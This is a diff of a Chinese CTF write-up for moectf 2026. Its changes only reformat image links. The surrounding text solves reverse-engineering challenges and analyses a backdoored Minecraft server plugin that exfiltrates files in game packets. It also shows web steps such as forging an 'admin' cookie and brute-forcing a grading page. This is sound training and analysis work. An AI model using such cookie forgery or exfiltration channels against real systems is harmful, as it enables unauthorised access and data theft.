@@ -127,7 +127,7 @@ section .data
 
 保存为一个asm后缀的程序，编译运行：
 
-![image-20260810165618600](./media/moectf 2026/image-20260810165618600.png)
+![image-20260810165618600](<./media/moectf 2026/image-20260810165618600.png>)
 
 ### bbxor
 
@@ -144,7 +144,7 @@ for ( n35_1 = 0; n35_1 <= 35; ++n35_1 )
   }
 ```
 
-![image-20260810170712945](./media/moectf 2026/image-20260810170712945.png)
+![image-20260810170712945](<./media/moectf 2026/image-20260810170712945.png>)
 
 计算ASCII：
 
@@ -212,13 +212,13 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 disas main
 ```
 
-![](./media/moectf 2026/image-20260814233659387.png)
+![](<./media/moectf 2026/image-20260814233659387.png>)
 
 运行：`r`
 
 然后查看s_位置（rbp-0x40）：
 
-![image-20260814235501723](./media/moectf 2026/image-20260814235501723.png)
+![image-20260814235501723](<./media/moectf 2026/image-20260814235501723.png>)
 
 的十六进制以及字符串
 
@@ -227,13 +227,13 @@ x/20xb $rbp-0x40          # 看十六进制
 x/s $rbp-0x40
 ```
 
-![image-20260814234607371](./media/moectf 2026/image-20260814234607371.png)
+![image-20260814234607371](<./media/moectf 2026/image-20260814234607371.png>)
 
 ### 请你喝茶
 
 flag共32字节，16字节在`check_tea_part`，16字节在`check_xtea_part`
 
-![image-20260810172258530](./media/moectf 2026/image-20260810172258530.png)
+![image-20260810172258530](<./media/moectf 2026/image-20260810172258530.png>)
 
 前16字节（标准的TEA，32 轮，delta = 0x9E3779B9）：
 
@@ -323,17 +323,17 @@ int main()
 
 运行：
 
-![image-20260810174852288](./media/moectf 2026/image-20260810174852288.png)
+![image-20260810174852288](<./media/moectf 2026/image-20260810174852288.png>)
 
 ### Ultra Potato Xplosion
 
 IDA打开了之后：
 
-<img src="./media/moectf 2026/image-20260815000614899.png" alt="image-20260815000614899" style="zoom:50%;" />
+![image-20260815000614899](<image-20260815000614899.png>)
 
 大概率有壳，试试upx脱壳：
 
-![image-20260815000717553](./media/moectf 2026/image-20260815000717553.png)
+![image-20260815000717553](<./media/moectf 2026/image-20260815000717553.png>)
 
 IDA打开main直接分析：
 
@@ -361,7 +361,7 @@ import base58
 print(base58.b58decode(b'Fnrr68qUFDSTA5tupNAp8pgrFPJNesF3R6KNk'))
 ```
 
-![image-20260815003038412](./media/moectf 2026/image-20260815003038412.png)
+![image-20260815003038412](<./media/moectf 2026/image-20260815003038412.png>)
 
 ### 奇怪的APP
 
@@ -432,7 +432,7 @@ print(base64.b64decode(b'bW9lY3Rme0Fwa19S'))
 print(base64.b64decode(b'Z2hUPyEhIX0='))
 ```
 
-![image-20260815101028067](./media/moectf 2026/image-20260815101028067.png)
+![image-20260815101028067](<./media/moectf 2026/image-20260815101028067.png>)
 
 拼接：moectf{Apk_REv3rse_1sghT?!!!}
 
@@ -452,7 +452,7 @@ print(base64.b64decode(b'Z2hUPyEhIX0='))
 print(base64.b64decode(b'X2Z1Tl9yMQ=='))
 ```
 
-![image-20260815101844186](./media/moectf 2026/image-20260815101844186.png)
+![image-20260815101844186](<./media/moectf 2026/image-20260815101844186.png>)
 
 拼接：moectf{Apk_REv3rse_1s_fuN_r1ghT?!!!}
 
@@ -870,7 +870,7 @@ flag = data[:31].decode()
 print(f" FLAG = {flag}")
 ```
 
-![image-20260822225049919](./media/moectf 2026/image-20260822225049919.png)
+![image-20260822225049919](<./media/moectf 2026/image-20260822225049919.png>)
 
 ### 成都好室友
 
@@ -880,7 +880,7 @@ print(f" FLAG = {flag}")
 xxd -l 16 chall15.pyc
 ```
 
-![image-20260822230748962](./media/moectf 2026/image-20260822230748962.png)
+![image-20260822230748962](<./media/moectf 2026/image-20260822230748962.png>)
 
 `6f 0d 0d 0a` 是 Python3.10的小端表示，必须用Python3.0来解析，尝试用3.0反编译：
 
@@ -889,7 +889,7 @@ pip install decompyle3
 decompyle3 chall15.pyc
 ```
 
-![image-20260822231304597](./media/moectf 2026/image-20260822231304597.png)
+![image-20260822231304597](<./media/moectf 2026/image-20260822231304597.png>)
 
 同样不支持，我们改用`dis`反汇编分析：
 
@@ -907,17 +907,17 @@ dis.dis(code)
 
 首先导入base64：
 
-![image-20260822232327413](./media/moectf 2026/image-20260822232327413.png)
+![image-20260822232327413](<./media/moectf 2026/image-20260822232327413.png>)
 
 然后加载了一个超长的字符串常量是base64编码的图片数据：
 
-![image-20260822232516913](./media/moectf 2026/image-20260822232516913.png)
+![image-20260822232516913](<./media/moectf 2026/image-20260822232516913.png>)
 
 然后对它作`.replace('\n', '').strip()`后存储变量`IMAGE_BASE64`
 
 然后定义了一个函数（解密图片的）：
 
-![image-20260822233138608](./media/moectf 2026/image-20260822233138608.png)
+![image-20260822233138608](<./media/moectf 2026/image-20260822233138608.png>)
 
 函数内部有异常处理，有检验签名，有写入文件和打印信息，将该反汇编还原成python源码即可实现解码base65为PNG图片并报错，求解脚本：
 
@@ -936,11 +936,11 @@ print("已写出 result.png，大小:", len(img), "bytes")
 
 生成了一个二维码：
 
-![result](./media/moectf 2026/result.png)
+![result](<./media/moectf 2026/result.png>)
 
 微信扫不出来，支付宝可以扫出来：
 
-![image-20260822194451204](./media/moectf 2026/image-20260822194451204.png)
+![image-20260822194451204](<./media/moectf 2026/image-20260822194451204.png>)
 
 ### 让我们说中文
 
@@ -950,7 +950,7 @@ print("已写出 result.png，大小:", len(img), "bytes")
 
 自定义表和base64表的内容：
 
-![image-20260810181452553](./media/moectf 2026/image-20260810181452553.png)
+![image-20260810181452553](<./media/moectf 2026/image-20260810181452553.png>)
 
 反向推输入：
 
@@ -970,7 +970,7 @@ chinese = bytes.fromhex(hex_str).decode('utf-8')
 print("中文描述:", chinese)
 ```
 
-![image-20260810181902001](./media/moectf 2026/image-20260810181902001.png)
+![image-20260810181902001](<./media/moectf 2026/image-20260810181902001.png>)
 
 翻译：`moectf{Spe4K_e@$y_W07ds}`
 
@@ -1087,7 +1087,7 @@ print(flag)
 
 原本z3求解出来是不带moectf{}的，这道题是套上去的moectf{}格式
 
-![image-20260815114007823](./media/moectf 2026/image-20260815114007823.png)
+![image-20260815114007823](<./media/moectf 2026/image-20260815114007823.png>)
 
 ### Ultato Polosion Xptra
 
@@ -1103,11 +1103,11 @@ file chall9.2
 $ strings -a chall9.2 | grep -i upx
 ```
 
-![image-20260822235157491](./media/moectf 2026/image-20260822235157491.png)
+![image-20260822235157491](<./media/moectf 2026/image-20260822235157491.png>)
 
 尝试UPX 5.20官方静态脱壳失败
 
-![image-20260822235334795](./media/moectf 2026/image-20260822235334795.png)
+![image-20260822235334795](<./media/moectf 2026/image-20260822235334795.png>)
 
 说明被魔改，最后只得上动调：
 
@@ -1143,7 +1143,7 @@ inf.write_memory(base + 0x10, data)
 print("patched OK")
 ```
 
-![image-20260823000201220](./media/moectf 2026/image-20260823000201220.png)
+![image-20260823000201220](<./media/moectf 2026/image-20260823000201220.png>)
 
 修正r13并继续：
 
@@ -1157,11 +1157,11 @@ print("patched OK")
 
 然后反汇编找到循环退出点：
 
-![image-20260823001400461](./media/moectf 2026/image-20260823001400461.png)
+![image-20260823001400461](<./media/moectf 2026/image-20260823001400461.png>)
 
 我们在循环退出点下硬件断点让循环跑完：
 
-![image-20260823001552560](./media/moectf 2026/image-20260823001552560.png)
+![image-20260823001552560](<./media/moectf 2026/image-20260823001552560.png>)
 
 停在 `0x889f` 时，主程序已解压完毕：
 
@@ -1170,9 +1170,9 @@ print("patched OK")
 (gdb) x/20i 0x4010d0 
 ```
 
-![image-20260823001816087](./media/moectf 2026/image-20260823001816087.png)
+![image-20260823001816087](<./media/moectf 2026/image-20260823001816087.png>)
 
-![image-20260823001928471](./media/moectf 2026/image-20260823001928471.png)
+![image-20260823001928471](<./media/moectf 2026/image-20260823001928471.png>)
 
 拿到main的地址在`0x4010e8: mov    $0x4014e4,%rdi`，脱壳完成
 
@@ -1304,7 +1304,7 @@ for val in v:
 print(flag.decode())
 ```
 
-![image-20260823003122821](./media/moectf 2026/image-20260823003122821.png)
+![image-20260823003122821](<./media/moectf 2026/image-20260823003122821.png>)
 
 ### 请 fanchai 喝茶
 
@@ -1358,7 +1358,7 @@ v(...) += ((z<<4 ^ v(...)>>5) + (z>>3 ^ v(...)<<2)) ^ ((sum ^ z) + (v(...) ^ key
 
 提取Key和4个目标密文的值：
 
-![image-20260815115638191](./media/moectf 2026/image-20260815115638191.png)
+![image-20260815115638191](<./media/moectf 2026/image-20260815115638191.png>)
 
 然后开始准备解密代码：从目标密文状态开始反向9轮按相反顺序恢复明文即为flag：
 
@@ -1448,7 +1448,7 @@ flag = struct.pack('<16I', *pt)
 print(flag.decode())
 ```
 
-![image-20260815164049656](./media/moectf 2026/image-20260815164049656.png)
+![image-20260815164049656](<./media/moectf 2026/image-20260815164049656.png>)
 
 ### 广晨风语录
 
@@ -1545,7 +1545,7 @@ __int64 __fastcall gcf::Verifier::verify(gcf::PayloadProcessor *a1, __int64 a2)
 
 我们读该数组出来：
 
-![image-20260822151018737](./media/moectf 2026/image-20260822151018737.png)
+![image-20260822151018737](<./media/moectf 2026/image-20260822151018737.png>)
 
 然后就是再抓一下校验逻辑里面引用的变换算法：
 
@@ -1605,7 +1605,7 @@ print(inp)
 print(inp.decode('utf-8', errors='replace'))
 ```
 
-![image-20260822153849918](./media/moectf 2026/image-20260822153849918.png)
+![image-20260822153849918](<./media/moectf 2026/image-20260822153849918.png>)
 
 把flag就挖出来了，第一个字符有点问题可能是IDA编码问题？不过问题不大改成moectf{}就行
 
@@ -1843,9 +1843,9 @@ __int64 __fastcall sub_7FF745792120(int a1)
 
 这俩哈希函数比较清晰了看着已经，都需要查表后对32位循环左移，一个用来生成final层的bias，一个用来生成final层的权重，我们先查表把内容扒出来：
 
-![image-20260915115431470](./media/moectf 2026/image-20260915115431470.png)
+![image-20260915115431470](<./media/moectf 2026/image-20260915115431470.png>)
 
-![image-20260915115508130](./media/moectf 2026/image-20260915115508130.png)
+![image-20260915115508130](<./media/moectf 2026/image-20260915115508130.png>)
 
 然后我们继续往下该看看Dense层函数了：
 
@@ -1878,21 +1878,21 @@ __int64 __fastcall sub_7FF745792030(__int64 a1, __int64 a2, _QWORD *a3, __int64 
 
  这个函数的逻辑结构也已经很清晰了，唯一的未知数也就是权重了，在start函数里面总共套用了三层我们因此需要找到三个权重：
 
-![image-20260915180715561](./media/moectf 2026/image-20260915180715561.png)
+![image-20260915180715561](<./media/moectf 2026/image-20260915180715561.png>)
 
 我们分别去对应的位置读取hex值也就拿到权重了：
 
-![image-20260911184225648](./media/moectf 2026/image-20260911184225648-1789435646499-1.png)
+![image-20260911184225648](<./media/moectf 2026/image-20260911184225648-1789435646499-1.png>)
 
-![image-20260911184348562](./media/moectf 2026/image-20260911184348562.png)
+![image-20260911184348562](<./media/moectf 2026/image-20260911184348562.png>)
 
-![image-20260911184450814](./media/moectf 2026/image-20260911184450814.png)
+![image-20260911184450814](<./media/moectf 2026/image-20260911184450814.png>)
 
-![image-20260911184600042](./media/moectf 2026/image-20260911184600042.png)
+![image-20260911184600042](<./media/moectf 2026/image-20260911184600042.png>)
 
-![image-20260911184711743](./media/moectf 2026/image-20260911184711743.png)
+![image-20260911184711743](<./media/moectf 2026/image-20260911184711743.png>)
 
-![image-20260911184824284](./media/moectf 2026/image-20260911184824284.png)
+![image-20260911184824284](<./media/moectf 2026/image-20260911184824284.png>)
 
 至此，数据全部集齐，我们写最终求解flag的完整脚本，由于从源文件中抓取的数字都过于巨大，因此对应的数据我直接通过读取脚本对应的位置写程序抓取，我首先将上面的分析模拟了一遍之后纯线性构造整网，然后通过Z3模拟器枚举候选最后从中找到md5与题目相同的拿到flag，求解脚本如下：
 
@@ -1986,13 +1986,13 @@ print('未命中, 请检查约束或数据')
 sys.exit(1)
 ```
 
-![image-20260915182910840](./media/moectf 2026/image-20260915182910840.png)
+![image-20260915182910840](<./media/moectf 2026/image-20260915182910840.png>)
 
 ### MCb4ckd00r
 
 这道题提供的附件有点多啊，一个sha256文件一个dll插件（恶意软件用来逆向）还有一个插件运行时的抓包，既然给了sha256我们就先比对比对：
 
-![image-20260919171411315](./media/moectf 2026/image-20260919171411315.png)
+![image-20260919171411315](<./media/moectf 2026/image-20260919171411315.png>)
 
 核对分析sha256一致，文件没有被改，接下来开始我们的分析，首先咱们先静态查一下文件的一些基本信息：
 
@@ -2002,17 +2002,17 @@ objdump -p CloudBlack.dll | head -80
 strings CloudBlack.dll | head -50
 ```
 
-![image-20260919172015882](./media/moectf 2026/image-20260919172015882.png)
+![image-20260919172015882](<./media/moectf 2026/image-20260919172015882.png>)
 
 我们可以看出来这个文件是个x64架构的，`ImageBase 0x180000000`基地址先记下来之后可能会用到，然后我们再往下看：
 
-![image-20260919172448074](./media/moectf 2026/image-20260919172448074.png)
+![image-20260919172448074](<./media/moectf 2026/image-20260919172448074.png>)
 
 这里导入了表的第一行`LeviLamina.dll`，应该是一个LeviLamina 的 mod，注册了玩家事件监听器，玩家一进服务器就能拿到他的名字，我们成功找到攻击链路的触发点
 
 我们再看Data Directory目录：
 
-![image-20260919173910022](./media/moectf 2026/image-20260919173910022.png)
+![image-20260919173910022](<./media/moectf 2026/image-20260919173910022.png>)
 
 可以看到Resource全为0说明没有资源段，而TLS有地址说明存在TLS回调表，以后可能会用到，记录一下地址
 
@@ -2023,9 +2023,9 @@ objdump -p CloudBlack.dll | grep -A 3 "DLL Name"
 strings -el CloudBlack.dll | head -40
 ```
 
-![image-20260919174310416](./media/moectf 2026/image-20260919174310416.png)
+![image-20260919174310416](<./media/moectf 2026/image-20260919174310416.png>)
 
-![image-20260919174522324](./media/moectf 2026/image-20260919174522324.png)
+![image-20260919174522324](<./media/moectf 2026/image-20260919174522324.png>)
 
 从输出来看，我们又找到两个dll，`WS2_32.dll`大概是用于网路发送，`bcrypt.dll`里面的函数我们看名字大概可以猜出来是有哈希和加密的；再看我们查的字符串，`CHACHA20_POLY1305`看名字大抵是`ChaCha20流密码+Poly1305 认证`，估摸是加密算法吧，还有哈希sha256也在字符串里，以及刚才在`bcrypt.dll`里面挖出来的属性名
 
@@ -2035,7 +2035,7 @@ strings -el CloudBlack.dll | head -40
 objdump -p CloudBlack.dll | grep -B 2 -A 15 "Export Address Table"
 ```
 
-![image-20260919175013445](./media/moectf 2026/image-20260919175013445.png)
+![image-20260919175013445](<./media/moectf 2026/image-20260919175013445.png>)
 
 导出表里面`ll_memory_operator_overrided`应该是LeviLamina要求的内存钩子，还有一个`ll_mod_load`应该就是真正的mod入口了也就是整个插件的入口
 
@@ -2043,7 +2043,7 @@ objdump -p CloudBlack.dll | grep -B 2 -A 15 "Export Address Table"
 
 dll文件的基础信息分析就先到这里，我们接下来转向pcapng，先把80端口的HTTP完整导出来：
 
-![image-20260919180049641](./media/moectf 2026/image-20260919180049641.png)
+![image-20260919180049641](<./media/moectf 2026/image-20260919180049641.png>)
 
 这里面结构很明显了，看GET和POST那两行，这两个地址先记下来后面应该会用到，然后导出HTTP对象：
 
@@ -2058,11 +2058,11 @@ tshark -r server-edge-capture.pcapng --export-objects http,export/
 cat export/* | head -c 2000
 ```
 
-![image-20260920090308601](./media/moectf 2026/image-20260920090308601.png)
+![image-20260920090308601](<./media/moectf 2026/image-20260920090308601.png>)
 
 可以看到每个条目里面都有应该proof看起来像是base64加密，可能用于密钥派生？还有一个`on`字段，我们方向只有1024那条是false其余都是true，此外还值得注意的像物品路径`route`，控制值`ctrl`；还有一个特别的地方，1013那条相比别的条目多了几个字段"`sid` / `ord` / `pos`"
 
-然后我们看wireshark里面![image-20260920091828532](./media/moectf 2026/image-20260920091828532.png)
+然后我们看wireshark里面![image-20260920091828532](<./media/moectf 2026/image-20260920091828532.png>)
 
 占大头的实际上是UDP，咱先写个python脚本统计一下所有UDP大包的第一字节找数据报：
 
@@ -2093,7 +2093,7 @@ for b, c in first.most_common(12):
     print(f"首字节 0x{b:02x}: {c}")
 ```
 
-![image-20260920093351130](./media/moectf 2026/image-20260920093351130.png)
+![image-20260920093351130](<./media/moectf 2026/image-20260920093351130.png>)
 
 `0x8c`×3603、`0x84`×2081 就是全部游戏数据，我们对每个数据报按帧解析（24 位序号、位长度、split 分片头），将 split 分片按 (id, 片号) 重组为完整消息：
 
@@ -2175,7 +2175,7 @@ for (kind, b), c in firstb.most_common(12):
     print(f"  {kind:10s} 首字节 0x{b:02x}: {c}")
 ```
 
-![image-20260920101324712](./media/moectf 2026/image-20260920101324712.png)
+![image-20260920101324712](<./media/moectf 2026/image-20260920101324712.png>)
 
 从结果来看，一共得到40040条，绝大多数的首字节为`0xfe`，这是基岩版协议的批量数据包，我们对其按照`fe ‖ 00 ‖ raw-deflate` 解压后，再按 varint 长度前缀切分：
 
@@ -2299,7 +2299,7 @@ for pid, c in sorted(pidc.items(), key=lambda x: -x[1]):
 pickle.dump(subs, open('subs.pkl', 'wb'))
 ```
 
-![image-20261002145623596](./media/moectf 2026/image-20261002145623596.png)
+![image-20261002145623596](<./media/moectf 2026/image-20261002145623596.png>)
 
 我们从批量解压的输出结果来看，总共有58117个子包，其中绝大多数是常规广播包（0xe4/0x6f/0x79 等），但仅凭数量无法判断外传通道，我们需要从发给谁、包多大、带不带数据三个维度来筛选，于是我又写了一个脚本
 
@@ -2331,9 +2331,9 @@ for pid in sorted(agg, key=lambda p: -agg[p]['n']):
 
 在该代码中，我们通过检验dp不等于19132的个数来判断pid出现的客户端端口，若只出现一个客户端端口则标明定性s2c。同时，我们通过查包内是否含`\x08\x01\x00\x61`（NBT 中 StringTag 字段名 `a` 的编码）来判断是否携带物品 NBT。代码最终运行结果如下：
 
-![image-20261002150150390](./media/moectf 2026/image-20261002150150390.png)
+![image-20261002150150390](<./media/moectf 2026/image-20261002150150390.png>)
 
-![image-20261002150951265](./media/moectf 2026/image-20261002150951265.png)
+![image-20261002150951265](<./media/moectf 2026/image-20261002150951265.png>)
 
 从该结果中，我们发现只有0x32唯一满足”定向+大载荷+带NBT“，因此可以定位0x32为外传通道，我们来查一下0x32发往哪里：
 
@@ -2341,7 +2341,7 @@ for pid in sorted(agg, key=lambda p: -agg[p]['n']):
 python3 -c 'import pickle,collections; subs=pickle.load(open("subs.pkl","rb")); print(collections.Counter(dp for sp_,dp,pid,sp in subs if pid==0x32))'
 ```
 
-![image-20261002153855880](./media/moectf 2026/image-20261002153855880.png)
+![image-20261002153855880](<./media/moectf 2026/image-20261002153855880.png>)
 
 0x32既然定向发往55193端口，那么55193是哪位玩家呢？由于玩家名只出现在登录阶段：客户端上线发 `0x01`（Login）包，内含 JWT Token（`eyJ…` 三段式），payload 的 `xname` 字段即玩家名，而Login 包是上行（目标端口为服务器 19132），需在子包中保留源端口才能与客户端对应，于是我们扩展 subs 为 (源端口，目标端口，pid, payload) 后提取：：
 
@@ -2367,7 +2367,7 @@ for sp_, dp, pid, sp in subs:
     print(f"玩家: {name:12s} (源端口 {sp_})  FNV-1a(全小写) = {fnv1a(name.lower())}")
 ```
 
-![image-20261002153350714](./media/moectf 2026/image-20261002153350714.png)
+![image-20261002153350714](<./media/moectf 2026/image-20261002153350714.png>)
 
 我们一共拿到三个玩家名，源端口分别是60546、59178和55193，其中Black Cloud 的 `FNV-1a("black cloud") = 1300896325`，恰好等于 config 中 entry 1013 的 `subject`，因此我们锁定1013 这条带 sid/ord/pos 特殊字段的窃取配置，服务于 Black Cloud
 
@@ -2386,7 +2386,7 @@ print("\n可打印:")
 print(big[:320])
 ```
 
-![image-20261002154807367](./media/moectf 2026/image-20261002154807367.png)
+![image-20261002154807367](<./media/moectf 2026/image-20261002154807367.png>)
 
 我们在可打印字符串里面发现了两个base64加密，第一段解码后恰好16字节，是一个认证标签，第二个解码后应该是一个密文，可以确定的是0x32就是`InventorySlotPacket` 里塞了一个物品 NBT，但只观察单个样本还不够，我们需要把27个数据块的全部字段完整解析出来
 
@@ -2461,9 +2461,9 @@ for k, nbt in enumerate(rows, 1):
     print(f"     tag={len(tag)}B  ct={len(ct)}B")
 ```
 
-![image-20261002160628647](./media/moectf 2026/image-20261002160628647.png)
+![image-20261002160628647](<./media/moectf 2026/image-20261002160628647.png>)
 
-![image-20261002160651702](./media/moectf 2026/image-20261002160651702.png)
+![image-20261002160651702](<./media/moectf 2026/image-20261002160651702.png>)
 
 从输出结果来看，我们发现s和p的值都是固定的，正是config中entry 1013 的 `sid` 与 `ctrl`的值，另外，n为27、v为1，t为文件ID，总共有七个被窃文件（4609/4610/4611/4612/4613/4614/4848），同一文件的f即CRC完全一致可用于重组校验，l与密文长度吻合（0x32里base64解码出来的密文长度）
 
@@ -2480,7 +2480,7 @@ for s in [b'CloudBlack/ShulkerCache/v1',
     print(s[:40], '文件偏移 0x%x' % i if i >= 0 else '未找到')
 ```
 
-![image-20261002161831540](./media/moectf 2026/image-20261002161831540.png)
+![image-20261002161831540](<./media/moectf 2026/image-20261002161831540.png>)
 
 我们再查一下各section的文件偏移和RVA间的映射，然后把上面找到的文件偏移换算成RVA：
 
@@ -2488,7 +2488,7 @@ for s in [b'CloudBlack/ShulkerCache/v1',
 objdump -h CloudBlack.dll
 ```
 
-![image-20261002162011774](./media/moectf 2026/image-20261002162011774.png)
+![image-20261002162011774](<./media/moectf 2026/image-20261002162011774.png>)
 
 我们发现两个常量均命中且位于 `.rdata` 段，而由于`CHACHA20_POLY1305、SHA256`以UTF-16存储，所以未命中
 
@@ -2506,7 +2506,7 @@ objdump -d CloudBlack.dll > dis.txt
 grep -n "25680\|278e8" dis.txt
 ```
 
-![image-20261006175135402](./media/moectf 2026/image-20261006175135402.png)
+![image-20261006175135402](<./media/moectf 2026/image-20261006175135402.png>)
 
 然后我们抓一下grep出的第一个引用点的汇编码：
 
@@ -2514,7 +2514,7 @@ grep -n "25680\|278e8" dis.txt
 sed -n '505,530p' dis.txt
 ```
 
-![image-20261006175601618](./media/moectf 2026/image-20261006175601618.png)
+![image-20261006175601618](<./media/moectf 2026/image-20261006175601618.png>)
 
 我们看看第一个被调函数0x139b0：
 
@@ -2523,13 +2523,13 @@ grep -n "1800139b0\|180013a40\|180013b" dis.txt
 objdump -d --start-address=0x1800139b0 --stop-address=0x180013b30 CloudBlack.dll
 ```
 
-![image-20261006180111018](./media/moectf 2026/image-20261006180111018.png)
+![image-20261006180111018](<./media/moectf 2026/image-20261006180111018.png>)
 
-![image-20261006180217383](./media/moectf 2026/image-20261006180217383.png)
+![image-20261006180217383](<./media/moectf 2026/image-20261006180217383.png>)
 
-![image-20261006180256158](./media/moectf 2026/image-20261006180256158.png)
+![image-20261006180256158](<./media/moectf 2026/image-20261006180256158.png>)
 
-![image-20261006180319827](./media/moectf 2026/image-20261006180319827.png)
+![image-20261006180319827](<./media/moectf 2026/image-20261006180319827.png>)
 
 从反汇编逻辑分析这个函数最终输出格式应该是`**CONST16(16B) ‖ LE32(subject) ‖ LE32(ctrl) ‖ AG(26B) ‖ LE32(sid) ‖ LE16(stream)**`，这个函数只负责拼接不负责加密，我们看下一个被调函数（继续往后反汇编）：
 
@@ -2537,7 +2537,7 @@ objdump -d --start-address=0x1800139b0 --stop-address=0x180013b30 CloudBlack.dll
 objdump -d --start-address=0x1800018dc --stop-address=0x180001900 CloudBlack.dll
 ```
 
-![image-20261006181007467](./media/moectf 2026/image-20261006181007467.png)
+![image-20261006181007467](<./media/moectf 2026/image-20261006181007467.png>)
 
 看到下一个被调函数0xa8c0我们反汇编看HMAC怎么实现的：
 
@@ -2673,7 +2673,7 @@ objdump -d --start-address=0x180023400 --stop-address=0x180023460 CloudBlack.dll
 objdump -p CloudBlack.dll | grep -A 12 "DLL Name: bcrypt.dll"
 ```
 
-![image-20261006185426785](./media/moectf 2026/image-20261006185426785.png)
+![image-20261006185426785](<./media/moectf 2026/image-20261006185426785.png>)
 
 两个的数目可以对上了都是10个，一一对应这俩表的话应该是：
 
@@ -2714,7 +2714,7 @@ objdump -d --start-address=0x18000b000 --stop-address=0x18000b200 CloudBlack.dll
 python3 -c "d=open('CloudBlack.dll','rb').read(); off=0x26cac-0x25000+0x24400; print(d[off:off+40].decode('utf-16le','ignore'))"
 ```
 
-![image-20261006191047995](./media/moectf 2026/image-20261006191047995.png)
+![image-20261006191047995](<./media/moectf 2026/image-20261006191047995.png>)
 
 然后开始建对称密钥：
 
@@ -2800,7 +2800,7 @@ objdump -d --start-address=0x180001a00 --stop-address=0x180001b80 CloudBlack.dll
 objdump -d --start-address=0x180013990 --stop-address=0x1800139b0 CloudBlack.dll
 ```
 
-![image-20261006192654322](./media/moectf 2026/image-20261006192654322.png)
+![image-20261006192654322](<./media/moectf 2026/image-20261006192654322.png>)
 
 一个小函数将nonce的拼装一览无余
 
@@ -2940,7 +2940,7 @@ for m in re.finditer(rb'moectf\{[^}]*\}', allp):
     print("FLAG:", m.group().decode())
 ```
 
-![image-20261006194014874](./media/moectf 2026/image-20261006194014874.png)
+![image-20261006194014874](<./media/moectf 2026/image-20261006194014874.png>)
 
 ## Web安全与渗透测试 
 
@@ -2948,11 +2948,11 @@ for m in re.finditer(rb'moectf\{[^}]*\}', allp):
 
 网页打开该静态html，F12打开网络搜m，查到学号
 
-![image-20260809195232713](./media/moectf 2026/image-20260809195232713.png)
+![image-20260809195232713](<./media/moectf 2026/image-20260809195232713.png>)
 
 搜学号：
 
-![image-20260809195513795](./media/moectf 2026/image-20260809195513795.png)
+![image-20260809195513795](<./media/moectf 2026/image-20260809195513795.png>)
 
 ### 归途
 
@@ -2990,7 +2990,7 @@ Content-Length: 108
 
 给了一组用户名密码：
 
-![image-20260811155426060](./media/moectf 2026/image-20260811155426060.png)
+![image-20260811155426060](<./media/moectf 2026/image-20260811155426060.png>)
 
 burp拦截请求发送（用户名密码用这个）：
 
@@ -3004,11 +3004,11 @@ Set-Cookie: user=guest; Path=/; SameSite=Lax
 
 浏览器访问http://127.0.0.1:18080/info用上面的用户名密码登录进去后：
 
-![image-20260811160337928](./media/moectf 2026/image-20260811160337928.png)
+![image-20260811160337928](<./media/moectf 2026/image-20260811160337928.png>)
 
 将Cookie改成admin再次尝试：
 
-![image-20260811160905131](./media/moectf 2026/image-20260811160905131.png)
+![image-20260811160905131](<./media/moectf 2026/image-20260811160905131.png>)
 
 爬虫限制文件是robots.txt，访问http://127.0.0.1:18080/robots.txt：
 
@@ -3019,13 +3019,13 @@ Disallow: /f13ggggg
 
 直接访问该地址http://127.0.0.1:18080/f13ggggg：
 
-![image-20260811161253934](./media/moectf 2026/image-20260811161253934.png)
+![image-20260811161253934](<./media/moectf 2026/image-20260811161253934.png>)
 
 汇总之前的key发现没有key1和key2，我们重新回到最开始，F12搜key1和key2：
 
-![image-20260811162030507](./media/moectf 2026/image-20260811162030507.png)
+![image-20260811162030507](<./media/moectf 2026/image-20260811162030507.png>)
 
-![image-20260811162005450](./media/moectf 2026/image-20260811162005450.png)
+![image-20260811162005450](<./media/moectf 2026/image-20260811162005450.png>)
 
 然后解码所有key的base64：
 
@@ -3041,15 +3041,15 @@ Disallow: /f13ggggg
 
 填入测试：
 
-![image-20260811162337744](./media/moectf 2026/image-20260811162337744.png)
+![image-20260811162337744](<./media/moectf 2026/image-20260811162337744.png>)
 
-![image-20260811162358216](./media/moectf 2026/image-20260811162358216.png)
+![image-20260811162358216](<./media/moectf 2026/image-20260811162358216.png>)
 
 ### 当零来敲门
 
 首先给了两个环境，一个是聊天室服务器一个是本地python服务，最开始不知道是干嘛的就先把两个端都打开之后发现聊天室服务器的界面服务是断开的每1s中就断开根本用不了，然后python服务进去了之后发现是python交互环境，尝试：
 
-![image-20260811170913306](./media/moectf 2026/image-20260811170913306.png)
+![image-20260811170913306](<./media/moectf 2026/image-20260811170913306.png>)
 
 发现几乎是空的说明重点不在文件系统，尝试测网络：
 
@@ -3058,7 +3058,7 @@ import requests
 print(requests.get('http://127.0.0.1:8080/').text)
 ```
 
-![image-20260811171026163](./media/moectf 2026/image-20260811171026163.png)
+![image-20260811171026163](<./media/moectf 2026/image-20260811171026163.png>)
 
 输出的响应和浏览器一模一样，因此可以确定，这个python环境本地运行着聊天室后端服务，于是重点就变成了在python端写脚本使成功在500前拿到flag
 
@@ -3208,7 +3208,7 @@ for m in all_ws:
 
 脚本运行结果：
 
-![image-20260811172553641](./media/moectf 2026/image-20260811172553641.png)
+![image-20260811172553641](<./media/moectf 2026/image-20260811172553641.png>)
 
 ### 查分系统_revenge
 
@@ -3222,11 +3222,11 @@ F12打开发现该系统没有任何动态js之类的东西，就是一个静态
 
 控制台依次查：
 
-<img src="./media/moectf 2026/image-20260811183953431.png" alt="image-20260811183953431" style="zoom:200%;" />
+![image-20260811183953431](<image-20260811183953431.png>)
 
 IV数据是base64加密
 
-![image-20260811184137952](./media/moectf 2026/image-20260811184137952.png)
+![image-20260811184137952](<./media/moectf 2026/image-20260811184137952.png>)
 
 学号加密是sha256
 
@@ -3294,11 +3294,11 @@ for (let number = 0; number < 100000000; number++) {
 
 运行：
 
-![image-20260811191159999](./media/moectf 2026/image-20260811191159999.png)
+![image-20260811191159999](<./media/moectf 2026/image-20260811191159999.png>)
 
-![image-20260811182128440](./media/moectf 2026/image-20260811182128440.png)
+![image-20260811182128440](<./media/moectf 2026/image-20260811182128440.png>)
 
-![image-20260811182104607](./media/moectf 2026/image-20260811182104607.png)
+![image-20260811182104607](<./media/moectf 2026/image-20260811182104607.png>)
 
 ### MoeCatchTheFrogs
 
@@ -3311,13 +3311,13 @@ for (let number = 0; number < 100000000; number++) {
 
 去翻一下`/static/js/app.js`，找到几个关键的接口及其用法如下：
 
-![image-20260815165927187](./media/moectf 2026/image-20260815165927187.png)
+![image-20260815165927187](<./media/moectf 2026/image-20260815165927187.png>)
 
-![image-20260815165947207](./media/moectf 2026/image-20260815165947207.png)
